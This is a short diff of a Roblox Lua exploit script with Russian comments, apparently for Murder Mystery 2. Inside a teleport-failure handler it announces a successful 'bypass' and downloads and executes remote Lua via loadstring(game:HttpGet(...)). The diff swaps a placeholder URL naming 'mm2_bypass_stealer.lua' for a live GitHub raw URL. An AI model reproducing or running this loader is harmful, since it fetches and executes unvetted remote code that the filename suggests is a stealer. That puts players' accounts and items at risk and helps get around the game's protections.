@@ -17,7 +17,7 @@ game:GetService("TeleportService").TeleportInitFailed:Connect(function(_,_,_,_,v
         print("Байпас сработал! Real JobId:", getgenv().RealJobId)
         
         -- Загружаем основной скрипт
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/mm2_bypass_stealer.lua"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptshubs1/farm/refs/heads/main/bypass.lua"))()
         
     ]], serverId, serverId))
 end)
